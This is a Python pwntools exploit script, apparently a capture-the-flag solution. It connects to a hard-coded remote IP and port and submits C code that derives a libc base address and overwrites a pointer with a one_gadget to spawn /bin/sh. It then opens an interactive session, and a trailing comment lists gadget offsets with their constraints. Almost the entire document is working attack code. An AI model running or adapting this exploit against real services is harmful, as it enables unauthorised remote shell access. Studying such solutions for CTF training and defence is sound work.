#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "182.92.73.10"
remotePort = 24573

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	li('buf_p: ' + hex(0x2060A0))
	ru('...')
	# printf, puts, read, open, write
	p = '''
int main(){ 
	int a;
	int* b;
	int base;
	int gadget;
	int* target;
	b = &a;
	base = (int)b - 0x503FD8;
	target = base + 0x5f0f48;
	gadget = base + 0x4526A;

	printf("%p\n", base);
	*target = gadget;
	printf("aa");
}
'''
	#read(0, target, 0x100);
	#db()
	s(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

  0x4526a execve("/bin/sh", rsp+0x30, environ)
  constraints:
    [rsp+0x30] == NULL

	0xf02a4 execve("/bin/sh", rsp+0x50, environ)
	constraints:
	  [rsp+0x50] == NULL

	  0xf1147 execve("/bin/sh", rsp+0x70, environ)
	  constraints:
	    [rsp+0x70] == NULL


'''
